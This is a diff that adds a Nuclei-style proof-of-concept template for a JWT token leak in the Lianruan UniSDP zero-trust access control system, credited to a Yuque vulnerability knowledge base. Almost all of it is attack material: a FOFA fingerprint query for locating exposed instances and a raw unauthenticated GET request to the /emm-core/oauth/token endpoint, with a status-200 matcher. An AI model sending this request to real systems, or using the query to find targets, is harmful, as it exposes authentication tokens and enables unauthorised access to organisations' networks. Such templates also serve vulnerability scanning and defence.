@@ -1,0 +1,21 @@
+id: poc-xyx3nvzikr280n7n
+info:
+  name: 联软UniSDP零信任访问控制系统 存在JWT Token泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xyx3nvzikr280n7n'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xyx3nvzikr280n7n
+    fofa: body="generateMenuTabTemplate" || title="UniSSOView"
+http:
+- raw:
+  - 'GET /emm-core/oauth/token HTTP/1.1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/89.0.3150.102 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
